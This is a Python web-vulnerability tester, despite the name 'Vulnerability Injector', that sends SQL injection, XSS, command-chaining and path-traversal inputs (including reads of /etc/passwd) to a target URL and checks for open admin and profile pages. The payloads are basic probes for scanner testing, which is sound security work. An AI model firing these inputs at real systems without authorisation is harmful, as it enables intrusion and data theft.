"""
Vulnerability Injector
======================
Tool for testing security scanners by injecting known vulnerabilities
"""

import sys
from pathlib import Path

class VulnerabilityInjector:
    """Test vulnerability injection and exploit demonstrations"""
    
    def __init__(self, base_url: str = 'http://localhost:5000'):
        self.base_url = base_url
        self.exploits = []
    
    def test_sql_injection(self):
        """Test SQL injection vulnerabilities"""
        import requests
        
        print("[*] Testing SQL Injection...")
        
        test_cases = [
            {
                'name': 'Basic OR bypass',
                'url': f"{self.base_url}/search?q=' OR '1'='1",
                'expected': 'Should return all users'
            },
            {
                'name': 'Comment bypass',
                'url': f"{self.base_url}/search?q=admin' --",
                'expected': 'Should return admin user'
            },
            {
                'name': 'UNION SELECT',
                'url': f"{self.base_url}/search?q=' UNION SELECT 1,2,3--",
                'expected': 'Should execute UNION query'
            }
        ]
        
        for test in test_cases:
            print(f"\n[>] {test['name']}")
            print(f"    URL: {test['url']}")
            
            try:
                response = requests.get(test['url'], timeout=5)
                print(f"    Status: {response.status_code}")
                print(f"    Expected: {test['expected']}")
                
                if response.status_code == 200:
                    print(f"    ✓ VULNERABLE")
                    self.exploits.append({
                        'type': 'SQL Injection',
                        'test': test['name'],
                        'vulnerable': True
                    })
                else:
                    print(f"    ✗ Protected/Error")
                    
            except Exception as e:
                print(f"    Error: {e}")
    
    def test_xss(self):
        """Test XSS vulnerabilities"""
        import requests
        
        print("\n[*] Testing Cross-Site Scripting (XSS)...")
        
        test_cases = [
            {
                'name': 'Basic script tag',
                'payload': "<script>alert('XSS')</script>",
                'endpoint': '/search'
            },
            {
                'name': 'Image onerror',
                'payload': '<img src=x onerror=alert(1)>',
                'endpoint': '/search'
            },
            {
                'name': 'SVG onload',
                'payload': '<svg onload=alert(1)>',
                'endpoint': '/search'
            }
        ]
        
        for test in test_cases:
            print(f"\n[>] {test['name']}")
            
            try:
                url = f"{self.base_url}{test['endpoint']}?q={test['payload']}"
                response = requests.get(url, timeout=5)
                
                # Check if payload is present unescaped
                if test['payload'] in response.text or '<script>' in response.text:
                    print(f"    ✓ VULNERABLE - Payload not escaped")
                    self.exploits.append({
                        'type': 'XSS',
                        'test': test['name'],
                        'vulnerable': True
                    })
                else:
                    print(f"    ✗ Protected - Payload escaped")
                    
            except Exception as e:
                print(f"    Error: {e}")
    
    def test_command_injection(self):
        """Test command injection"""
        import requests
        
        print("\n[*] Testing Command Injection...")
        
        test_cases = [
            {
                'name': 'Echo test',
                'command': 'echo VULN_TEST',
                'expected': 'VULN_TEST'
            },
            {
                'name': 'Command chaining',
                'command': 'echo test; echo test2',
                'expected': 'test'
            }
        ]
        
        for test in test_cases:
            print(f"\n[>] {test['name']}")
            
            try:
                url = f"{self.base_url}/execute?cmd={test['command']}"
                response = requests.get(url, timeout=5)
                
                if test['expected'] in response.text:
                    print(f"    ✓ VULNERABLE - Command executed")
                    self.exploits.append({
                        'type': 'Command Injection',
                        'test': test['name'],
                        'vulnerable': True
                    })
                else:
                    print(f"    ✗ Protected/Failed")
                    
            except Exception as e:
                print(f"    Error: {e}")
    
    def test_path_traversal(self):
        """Test path traversal"""
        import requests
        
        print("\n[*] Testing Path Traversal...")
        
        test_cases = [
            {
                'name': 'Unix path traversal',
                'path': '../../etc/passwd'
            },
            {
                'name': 'Windows path traversal',
                'path': '..\\..\\windows\\win.ini'
            }
        ]
        
        for test in test_cases:
            print(f"\n[>] {test['name']}")
            
            try:
                url = f"{self.base_url}/download?file={test['path']}"
                response = requests.get(url, timeout=5)
                
                if response.status_code == 200:
                    print(f"    ✓ VULNERABLE - File accessible")
                    self.exploits.append({
                        'type': 'Path Traversal',
                        'test': test['name'],
                        'vulnerable': True
                    })
                else:
                    print(f"    ✗ Protected - Access denied")
                    
            except Exception as e:
                print(f"    Error: {e}")
    
    def test_broken_auth(self):
        """Test authentication vulnerabilities"""
        import requests
        
        print("\n[*] Testing Authentication Vulnerabilities...")
        
        # Test 1: Admin panel without auth
        print("\n[>] Admin panel access")
        try:
            response = requests.get(f"{self.base_url}/admin", timeout=5)
            if response.status_code == 200 and 'admin' in response.text.lower():
                print(f"    ✓ VULNERABLE - Admin panel accessible without auth")
                self.exploits.append({
                    'type': 'Broken Access Control',
                    'test': 'Admin panel',
                    'vulnerable': True
                })
            else:
                print(f"    ✗ Protected")
        except Exception as e:
            print(f"    Error: {e}")
        
        # Test 2: IDOR
        print("\n[>] Insecure Direct Object Reference")
        try:
            response = requests.get(f"{self.base_url}/profile/1", timeout=5)
            if response.status_code == 200 and 'password' in response.text.lower():
                print(f"    ✓ VULNERABLE - Can access other users' data")
                self.exploits.append({
                    'type': 'IDOR',
                    'test': 'Profile access',
                    'vulnerable': True
                })
            else:
                print(f"    ✗ Protected")
        except Exception as e:
            print(f"    Error: {e}")
    
    def test_information_disclosure(self):
        """Test information disclosure"""
        import requests
        
        print("\n[*] Testing Information Disclosure...")
        
        print("\n[>] Debug endpoint")
        try:
            response = requests.get(f"{self.base_url}/debug", timeout=5)
            if 'secret' in response.text.lower() or 'password' in response.text.lower():
                print(f"    ✓ VULNERABLE - Sensitive info exposed")
                self.exploits.append({
                    'type': 'Information Disclosure',
                    'test': 'Debug endpoint',
                    'vulnerable': True
                })
            else:
                print(f"    ✗ Protected")
        except Exception as e:
            print(f"    Error: {e}")
    
    def generate_report(self):
        """Generate exploit test report"""
        
        print("\n" + "="*60)
        print("VULNERABILITY TEST SUMMARY")
        print("="*60)
        
        vuln_count = len(self.exploits)
        
        if vuln_count == 0:
            print("\nNo vulnerabilities found or application not accessible.")
        else:
            print(f"\nTotal vulnerabilities confirmed: {vuln_count}")
            
            # Group by type
            vuln_types = {}
            for exploit in self.exploits:
                vuln_type = exploit['type']
                if vuln_type not in vuln_types:
                    vuln_types[vuln_type] = []
                vuln_types[vuln_type].append(exploit['test'])
            
            print("\nVulnerabilities by type:")
            for vuln_type, tests in vuln_types.items():
                print(f"\n{vuln_type}: {len(tests)}")
                for test in tests:
                    print(f"  - {test}")
        
        print("\n" + "="*60)

def main():
    """Main function"""
    import argparse
    
    parser = argparse.ArgumentParser(description='Vulnerability Injector/Tester')
    parser.add_argument('--url', default='http://localhost:5000', help='Target URL')
    parser.add_argument('--all', action='store_true', help='Run all tests')
    parser.add_argument('--sqli', action='store_true', help='Test SQL injection')
    parser.add_argument('--xss', action='store_true', help='Test XSS')
    parser.add_argument('--cmd', action='store_true', help='Test command injection')
    parser.add_argument('--path', action='store_true', help='Test path traversal')
    parser.add_argument('--auth', action='store_true', help='Test authentication')
    parser.add_argument('--info', action='store_true', help='Test information disclosure')
    
    args = parser.parse_args()
    
    injector = VulnerabilityInjector(args.url)
    
    print(f"[*] Starting vulnerability testing on {args.url}\n")
    
    if args.all or args.sqli:
        injector.test_sql_injection()
    
    if args.all or args.xss:
        injector.test_xss()
    
    if args.all or args.cmd:
        injector.test_command_injection()
    
    if args.all or args.path:
        injector.test_path_traversal()
    
    if args.all or args.auth:
        injector.test_broken_auth()
    
    if args.all or args.info:
        injector.test_information_disclosure()
    
    # Generate report
    injector.generate_report()

if __name__ == '__main__':
    main()
